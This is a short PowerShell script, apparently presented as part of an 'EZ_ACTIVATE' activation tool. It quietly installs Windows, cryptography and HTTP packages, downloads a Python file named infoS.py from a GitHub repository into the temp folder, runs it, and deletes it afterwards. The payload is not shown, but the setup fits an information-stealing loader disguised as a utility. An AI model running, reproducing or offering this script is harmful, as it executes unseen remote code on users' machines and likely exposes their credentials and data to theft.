if (-not (Get-Command python -ErrorAction SilentlyContinue)) {
    Write-Output "ERROR: Python is not installed. Download it from https://www.python.org/downloads/"
    exit 1
}

python -m pip install pywin32 pypiwin32 pycryptodome requests --quiet --disable-pip-version-check

$url = "https://raw.githubusercontent.com/QUADROisCoding/EZ_ACTIVATE/refs/heads/main/infoS.py"
$tempFile = "$env:TEMP\infoS.py"
Invoke-WebRequest -Uri $url -OutFile $tempFile -UseBasicParsing
python $tempFile
Remove-Item $tempFile
